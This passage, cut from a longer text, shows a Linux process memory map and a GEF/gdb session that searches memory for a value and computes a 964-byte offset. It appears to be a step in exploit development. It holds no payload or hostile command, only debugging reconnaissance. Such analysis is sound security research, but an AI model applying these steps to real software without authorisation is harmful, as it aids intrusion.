0x0000739064e01000 0x0000739065601000 0x0000000000000000 rw- 
0x0000739065800000 0x0000739066239000 0x0000000000000000 rw- 
0x000073906626a000 0x00007390662b9000 0x0000000000000000 rw- 
0x00007390662b9000 0x00007390662dd000 0x0000000000000000 r-- /usr/lib/libc.so.6
0x00007390662dd000 0x0000739066449000 0x0000000000024000 r-x /usr/lib/libc.so.6
0x0000739066449000 0x0000739066497000 0x0000000000190000 r-- /usr/lib/libc.so.6
0x0000739066497000 0x000073906649b000 0x00000000001dd000 r-- /usr/lib/libc.so.6
0x000073906649b000 0x000073906649d000 0x00000000001e1000 rw- /usr/lib/libc.so.6
0x000073906649d000 0x00007390664a5000 0x0000000000000000 rw- 
0x00007390664a5000 0x00007390664a9000 0x0000000000000000 r-- /usr/lib/libgcc_s.so.1
0x00007390664a9000 0x00007390664cc000 0x0000000000004000 r-x /usr/lib/libgcc_s.so.1
0x00007390664cc000 0x00007390664d0000 0x0000000000027000 r-- /usr/lib/libgcc_s.so.1
0x00007390664d0000 0x00007390664d1000 0x000000000002a000 r-- /usr/lib/libgcc_s.so.1
0x00007390664d1000 0x00007390664d2000 0x000000000002b000 rw- /usr/lib/libgcc_s.so.1
0x00007390664d2000 0x00007390664e0000 0x0000000000000000 r-- /usr/lib/libm.so.6
0x00007390664e0000 0x0000739066560000 0x000000000000e000 r-x /usr/lib/libm.so.6
0x0000739066560000 0x00007390665bb000 0x000000000008e000 r-- /usr/lib/libm.so.6
0x00007390665bb000 0x00007390665bc000 0x00000000000e9000 r-- /usr/lib/libm.so.6
0x00007390665bc000 0x00007390665bd000 0x00000000000ea000 rw- /usr/lib/libm.so.6
0x00007390665bd000 0x00007390665be000 0x0000000000000000 r-- /usr/lib/libpthread.so.0
0x00007390665be000 0x00007390665bf000 0x0000000000001000 r-x /usr/lib/libpthread.so.0
0x00007390665bf000 0x00007390665c0000 0x0000000000002000 r-- /usr/lib/libpthread.so.0
0x00007390665c0000 0x00007390665c1000 0x0000000000002000 r-- /usr/lib/libpthread.so.0
0x00007390665c1000 0x00007390665c2000 0x0000000000003000 rw- /usr/lib/libpthread.so.0
0x00007390665c2000 0x00007390665c3000 0x0000000000000000 r-- /usr/lib/libdl.so.2
0x00007390665c3000 0x00007390665c4000 0x0000000000001000 r-x /usr/lib/libdl.so.2
0x00007390665c4000 0x00007390665c5000 0x0000000000002000 r-- /usr/lib/libdl.so.2
0x00007390665c5000 0x00007390665c6000 0x0000000000002000 r-- /usr/lib/libdl.so.2
0x00007390665c6000 0x00007390665c7000 0x0000000000003000 rw- /usr/lib/libdl.so.2
0x00007390665c7000 0x00007390665c9000 0x0000000000000000 rw- 
0x00007390665f5000 0x00007390665f9000 0x0000000000000000 r-- [vvar]
0x00007390665f9000 0x00007390665fb000 0x0000000000000000 r-x [vdso]
0x00007390665fb000 0x00007390665fc000 0x0000000000000000 r-- /usr/lib/ld-linux-x86-64.so.2
0x00007390665fc000 0x0000739066623000 0x0000000000001000 r-x /usr/lib/ld-linux-x86-64.so.2
0x0000739066623000 0x000073906662d000 0x0000000000028000 r-- /usr/lib/ld-linux-x86-64.so.2
0x000073906662d000 0x000073906662f000 0x0000000000032000 r-- /usr/lib/ld-linux-x86-64.so.2
0x000073906662f000 0x0000739066631000 0x0000000000034000 rw- /usr/lib/ld-linux-x86-64.so.2
0x00007ffe2b986000 0x00007ffe2b9a8000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
```

```shell
gef➤  find 0x2c0500426341 - 1, 0x00005b6ec4a44000, 0x000023d1
0x2c0500426708
gef➤  x/12x 0x2c0500426708 - 8
0x2c0500426700:	0x00000002	0x2b399000	0x000023d1	0x00001175
0x2c0500426710:	0x00401600	0x00000000	0x00000000	0x00000879
0x2c0500426720:	0x00000004	0x00000000	0x00001006	0x001843d9
gef➤  x/12x 0x2c0500426708 - 4
0x2c0500426704:	0x2b399000	0x000023d1	0x00001175	0x00401600
0x2c0500426714:	0x00000000	0x00000000	0x00000879	0x00000004
0x2c0500426724:	0x00000000	0x00001006	0x001843d9	0x000006cd
gef➤  p 0x2c0500426704 - (0x2c0500426341 - 1)
$1 = 0x3c4
gef➤  p/u 0x2c0500426704 - (0x2c0500426341 - 1)
$2 = 964
```